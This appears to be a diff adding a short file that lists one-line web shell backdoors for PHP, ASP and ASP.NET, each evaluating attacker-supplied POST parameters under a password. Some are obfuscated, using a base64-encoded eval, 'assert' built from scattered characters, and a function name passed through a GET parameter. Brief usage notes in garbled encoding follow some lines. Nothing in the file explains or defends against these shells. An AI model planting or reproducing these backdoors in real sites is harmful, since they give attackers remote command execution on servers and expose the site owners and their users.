@@ -1,0 +1,11 @@
+PHP:    <?php eval($_POST[xlcst])?>
+ASP:    <%eval request("xlcst")%>
+ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+
+<?php base64_decode(ZXZhbCgkX1BPU1RbcnVpamlhbmdtZWldKQ==) ?> ÃÜÂë ruijiangmei
+<?
+$idot="aIsIsSe7r5t"; 
+$idot=$idot{0}.$idot{2}.$idot{4}.$idot{6}.$idot{8}.$idot{10};   
+$idot($_POST['xlcst']);
+?>
+<?php $_GET[f]($_POST[cmd]);?>  ÓÃ·¨xx.php£¿f=assertÃÜÂëcmd.php
